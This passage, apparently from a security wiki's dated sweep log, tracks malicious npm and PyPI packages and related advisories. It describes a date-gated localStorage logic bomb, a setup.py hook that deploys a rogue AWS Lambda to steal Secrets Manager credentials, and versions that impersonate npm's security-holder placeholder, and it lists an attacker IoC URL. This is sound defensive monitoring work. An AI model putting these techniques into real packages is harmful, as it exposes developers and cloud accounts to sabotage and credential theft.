`0.0.0-stage` + `99.x` inflated-version grammar is the return signature).

**`future-scripts` (`MAL-2026-17418`, Sep 30) — GHSA mirror `GHSA-c9xw-xmvx-ffm7` landed 06:31 UTC and this wiki unpacked the LIVE package:** latest `0.0.3` still installable (10 dl/wk) and contains `boom()` — a date-gated browser logic bomb that, on **October 10, 2026**, runs `localStorage.setItem('key', i)` **100,000,000 times synchronously** (page-freeze/QuotaExceeded DoS). Version 0.0.2 called `boom()` from the exported `getCommonDateInRanges()` BEFORE input validation; the "fixed" 0.0.3 **retains the function as a live export** and merely stops auto-calling it — the same clean-latest-keeps-the-bomb shape as the MALFEX `cdn-img-fetch` 1.0.4 removal, but weaker: here the trigger path was only unwired, not deleted. No exfil, no network calls (advisory: "static finding, actual victim impact not observed"). Durable: date-gated logic bombs are in the npm live-package population — a package whose behavior changes on a calendar date needs review of the DATE PATH, not just the current call graph.

**GHSA malware-class Oct 1 tally (this wiki pull): 46 advisories**, composition: (a) a 03:31:14–15 UTC 13-name amazon-inspector backlog drain (mms-ref-dedserver/mms-ref-client/mms-simulation/mms-tools/mms-thin-client/mms-service, set-egs-backend, qa-egs-rollback, player-support-tools-ui, ssp-config-management-tool, generator-epic-react, store-service-worker, mod-manager — all already `0.0.1-security` holdered, OSV-origin records tracing to 2025 MAL IDs = the July-backlog pattern continuing); (b) a 03:41–03:46 UTC seven-name disposable-grammar cluster (`pf25262`/`pf23727`/`pf25133`/`pflag14570`/`pflag29424`/`pulse-pwn-9f3a2`/`my-ctf-helper-script-9921`) where creation→holder→GHSA ran inside ~60 seconds (pipeline clock already on-wiki), placeholders verified by this wiki (tarballs contain only the security-holder README; `pulse-pwn-9f3a2` + `pflag29424` time blocks show a `0.0.0-stage` version OSV never listed — same stage-publishing grammar as `online-header` three hours later); (c) the two 15:30:25 UTC same-second mirrors (`online-header` + the friendly-tools pair already recorded). Also Oct 1 afternoon: **the vm2 sandbox-escape flood CONTINUED** — ≥10 more vm2 advisories 15:32–15:42 UTC (CVE-2026-92935/92937/92940/92948/92949/92950/92951/92952/92957/92958, on top of the thirty-sixth sweep's CVE-2026-92938/39/41/44/45 quintet, fixed 3.11.7) — routine CNA volume against the sandbox itself, no ITW, below page bar, recorded for completeness; piscina CVE-2026-102992 as noted last sweep.

## <a id="october-1-thirty-ninth-sweep"></a>October 1 thirty-ninth sweep (~21:25–21:55 UTC): KEV moves — FortiMail path-traversal row, first of October, 3-day BOD deadline; OSV stream moves — `spo365-graph` deploys a rogue AWS Lambda to drain Secrets Manager, deleted before its advisory; all heartbeats quiet

**OSV stream moved: HIGH-WATER NOW `MAL-2026-17421`, resume 17422** (17422+ not-found via `api.osv.dev/v1/vulns/`). The single new record is a substantive one — **`spo365-graph` (PyPI), kam193 campaign `2026-10-spo365-graph`**, published 18:58 UTC, imported 19:40 UTC: **setup.py install-command override that deploys a ROGUE AWS LAMBDA FUNCTION to collect credentials from AWS Secrets Manager, plus other data, then exfiltrates** — flagged `targetted-attack` + `exfiltration-cloud-tokens` + `exfiltration-credentials`. IoC URL is an S3 object dressed as a CloudFormation health-check: `catdig-azdo-cfn-platform-bravo-prod-us-east-2.s3.amazonaws.com/cfn-artifacts/platform-bravo-api-health-check.json` — **this wiki: HTTP 403 AccessDenied** (bucket name live, object gone or ACL-tightened) = staging artifact already rotated away. Fortinet's affected/fixed table: **FortiMail 8.0.0–8.0.1 → "upgrade to UPCOMING 8.0.2 or above"; 7.6.0–7.6.6 → UPCOMING 7.6.7; 7.4.0–7.4.8 → UPCOMING 7.4.9; 7.2.0–7.2.9 → upgrade to branch 7.4 or above**. Every fixed release is a FUTURE release — **the patches do not exist yet while CISA's BOD clock runs out Oct 4** (KEV due-dates assume a remediation path exists; this row currently doesn't have one). Vendor interim workaround: **disable IBE — `config system encryption ibe / set status disable / end`** — the only defender action available until the builds ship; also note the advisory's own impact line reads "Execute unauthorized code or commands," slightly beyond KEV's file-write phrasing. OSV-keyed consumers are now covered for the whole-history compromise. **Tarball survivor check (this wiki): ALL 404** — npm direct, unpkg, and jsDelivr (`cdn.jsdelivr.net/npm/illusion-datalab@1.1.5/package.json` = 404) for both oldest 1.1.1 and newest 1.1.5 = payload permanently unknowable from public caches; the GHSA origin sha remains the only artifact reference. **`GHSA-x567-p88w-3697` (`homestack-cheer`) REMAINS OSV-BLIND** — direct OSV query for that GHSA returns no record while the GHSA (covering the entire 1.0.0–1.1.9 history) is live on GitHub: OSV-first and GHSA-first blindness both persist in parallel; Dependabot sees it, pip-audit/OSV-keyed tooling does not. Monitor: whether the OSV mirror arrives (Sep 22 baseline: Aug-era names sat GHSA-less for 34–45 days — the reverse direction has no established clock).

**NEW intelligence — `GHSA-27m4-jjxc-69wf` `kartykgithub-ph-b` (npm, CRITICAL, CWE-506): the first on-wiki GHSA whose vulnerable-version range includes `0.0.1-security` placeholder-shaped versions.** Registry forensics from the surviving time document: versions `0.0.1-security` published **Oct 1 20:31:52 UTC**, `0.0.1-security.0` at **20:32:49**, and `1.0.0` at **20:32:56 — 7.3 seconds after the second placeholder-shape publish**; the name document itself was RE-CREATED at Oct 2 01:21:12 UTC by a fresh version `0.0.1-security.1` — which this wiki pulled and verified is the genuine npm security-holder placeholder (maintainer `npm`, repository `npm/security-holder`, standard README). The GHSA (published 01:21:27 UTC, **+15 s after the re-holder**) flags exactly the three ORIGINAL versions `= 0.0.1-security`, `= 0.0.1-security.0`, `= 1.0.0` as malicious. Two consistent readings, both durable: (a) the attacker published **security-holder-impersonating versions** (`0.0.1-security` / `.0`) as camouflage plus `1.0.0` as the payload, or (b) a queued attacker publish of `1.0.0` slipped into the seven-second window after genuine holder creation, and detection+re-holder took ~4 h 49 m. Either way the hunt rule changes: **a `0.0.1-security*` version is no longer benign-by-appearance — verify the maintainer is `npm` and the repository is `npm/security-holder` before trusting a holdered name; and a GHSA range that lists security-holder version strings means the name was contested, not cleared.** State at check: only the genuine `0.0.1-security.1` remains; original tarballs 404 on npm and unpkg = payload unknowable; downloads API 0 last-week = zero public exposure; **zero OSV record** (GHSA-first blindness again — OSV query for the name empty at check). Name grammar (`kartykgithub-ph-b`) = disposable/probe-shaped, sits in the same Sep 21–Oct 1 keyboard-walk/disposable-name population as `pf*`/`pflag*`/`pulse-pwn*`; no OSV/GHSA history for the name before Oct 1. Monitor: OSV backfill arrival, whether the holder-impersonation shape recurs on other names, whether `1.0.0` re-registration attempt follows (the `online-header` return-signature pattern).

**GHSA mirror watch closed:** **`GHSA-2wm2-fc38-63vw` — `shortneer` (PyPI) GHSA mirror LANDED 2026-10-02T00:31:22 UTC**, ~3.5 h after the OSV record's 21:00 UTC publication = inside the standing 3–4 h OSV→GHSA baseline (contrast the spo365-graph 2.5 h fast-mirror).
